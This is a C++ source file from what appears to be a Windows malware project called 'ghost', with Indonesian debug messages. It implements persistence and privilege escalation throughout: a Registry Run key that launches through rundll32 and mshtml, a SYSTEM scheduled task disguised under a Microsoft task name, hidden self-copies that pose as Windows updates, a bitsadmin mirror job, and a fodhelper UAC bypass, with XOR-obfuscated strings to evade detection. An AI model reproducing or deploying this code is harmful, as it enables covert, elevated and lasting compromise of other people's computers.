#include "persistence.h"
#include "../core/ghost_core.h"
#include "../core/config.h"
#include <shlwapi.h>
#include <shellapi.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <fstream> 

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

namespace ghost {
namespace persistence {

namespace {

#ifndef PERSIST_PATH_1
#define PERSIST_PATH_1 L"%LOCALAPPDATA%\\Microsoft\\Windows\\sysupd.exe"
#endif

#ifndef PERSIST_PATH_2
#define PERSIST_PATH_2 L"%TEMP%\\win_security_update.exe"
#endif

template <size_t N>
class ObfuscatedWString {
    wchar_t m_data[N];
    wchar_t m_key;
public:
    constexpr ObfuscatedWString(const wchar_t (&str)[N], wchar_t key) : m_data{0}, m_key(key) {
        for (size_t i = 0; i < N; ++i) {
            m_data[i] = str[i] ^ key;
        }
    }
    std::wstring decrypt() const {
        std::wstring result(N - 1, L'\0');
        for (size_t i = 0; i < N - 1; ++i) {
            result[i] = m_data[i] ^ m_key;
        }
        return result;
    }
};

#define OBF_W(str) ObfuscatedWString<sizeof(str)/sizeof(wchar_t)>(str, L'K').decrypt()

void LogDebug(const std::wstring& message) {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring logFile = std::wstring(tempPath) + OBF_W(L"ghost_uts_debug.log");
    
    std::wofstream file(logFile, std::ios::app);
    if (file.is_open()) {
        file << message << std::endl;
    }
}

std::wstring GetSelfPath() {
    wchar_t path[MAX_PATH] = {0};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    return path;
}

bool RunSilentApp(const std::wstring& app, const std::wstring& params) {
    std::wstring verb = OBF_W(L"open"); 

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb       = verb.c_str(); 
    sei.lpFile       = app.c_str();
    sei.lpParameters = params.c_str();
    sei.nShow        = SW_HIDE;
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;
    
    bool success = ShellExecuteExW(&sei);
    if (!success) {
        LogDebug(OBF_W(L"[-] Gagal eksekusi."));
    }
    return success;
}

bool IsUserAnAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID administratorsGroup;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(administratorsGroup);
    }
    return isAdmin == TRUE;
}

std::wstring ExpandPath(const std::wstring& path) {
    wchar_t expanded[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(path.c_str(), expanded, MAX_PATH);
    return expanded;
}

} 

bool InstallAllMechanisms() {
    bool success = false;
    LogDebug(OBF_W(L"--- Memulai Eksekusi Persistensi UTS ---"));

    if (InstallRegistryRunKey()) { success = true; LogDebug(OBF_W(L"[+] Registry Run Key Berhasil.")); }
    if (CreateScheduledTask()) { success = true; LogDebug(OBF_W(L"[+] Scheduled Task Berhasil.")); }
    if (DuplicateToProtectedFolders()) { success = true; LogDebug(OBF_W(L"[+] Duplikasi Folder Berhasil.")); }
    if (InstallBitsadminMirror()) { success = true; LogDebug(OBF_W(L"[+] Bitsadmin Berhasil.")); }

    if (!IsUserAnAdmin()) {
        LogDebug(OBF_W(L"[*] User bukan Admin, mencoba UAC Bypass..."));
        if (UacBypassElevation()) { success = true; LogDebug(OBF_W(L"[+] UAC Bypass Berhasil.")); }
    } else {
        LogDebug(OBF_W(L"[*] User sudah Admin, melewati UAC Bypass."));
    }

    return success;
}

bool InstallRegistryRunKey() {
    HKEY hKey;
    std::wstring regPath = OBF_W(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"); 

    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    std::wstring cmd = OBF_W(L"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \" + \"document.write('<script>location.href=\\\"file:///") +
                       GetSelfPath() + OBF_W(L"\\\"</script>')\"");

    result = RegSetValueExW(hKey, OBF_W(L"sysupd").c_str(), 0, REG_SZ,
                            (BYTE*)cmd.c_str(),
                            (cmd.length() + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS);
}

bool CreateScheduledTask() {
    std::wstring app = OBF_W(L"schtasks.exe");
    std::wstring params = OBF_W(L"/create /tn \"Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\" /tr \"") 
                          + GetSelfPath() + OBF_W(L"\" /sc minute /mo 15 /ru SYSTEM /f /rl HIGHEST");

    return RunSilentApp(app, params);
}

bool UacBypassElevation() {
    std::wstring cmd = OBF_W(L"fodhelper.exe");
    std::wstring regPath = OBF_W(L"Software\\Classes\\ms-settings\\Shell\\Open\\command");

    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath.c_str(), 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, nullptr, 0, REG_SZ, (BYTE*)GetSelfPath().c_str(), 
                       (GetSelfPath().length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, OBF_W(L"DelegateExecute").c_str(), 0, REG_SZ, (BYTE*)L"", sizeof(L""));
        RegCloseKey(hKey);

        RunSilentApp(cmd, L"");

        Sleep(2000);
        RegDeleteTreeW(HKEY_CURRENT_USER, OBF_W(L"Software\\Classes\\ms-settings").c_str());
        return true;
    } else {
        return false;
    }
}

bool DuplicateToProtectedFolders() {
    std::vector<std::wstring> targets = {
        ExpandPath(PERSIST_PATH_1),
        ExpandPath(PERSIST_PATH_2),
        ExpandPath(OBF_W(L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\upd.lnk"))
    };

    bool success = false;
    for (const auto& target : targets) {
        if (CopyFileW(GetSelfPath().c_str(), target.c_str(), FALSE)) {
            SetFileAttributesW(target.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            success = true;
        }
    }

    return success;
}

bool InstallBitsadminMirror() {
    std::wstring app = OBF_W(L"bitsadmin.exe");
    
    bool step1 = RunSilentApp(app, OBF_W(L"/create /download ghost_mirror \"") + GetSelfPath() + OBF_W(L"\" \"") + ExpandPath(OBF_W(L"%TEMP%\\ghost_mirror.exe")) + OBF_W(L"\""));
    bool step2 = RunSilentApp(app, OBF_W(L"/resume ghost_mirror"));

    return step1 && step2;
}

} // namespace persistence
} // namespace ghost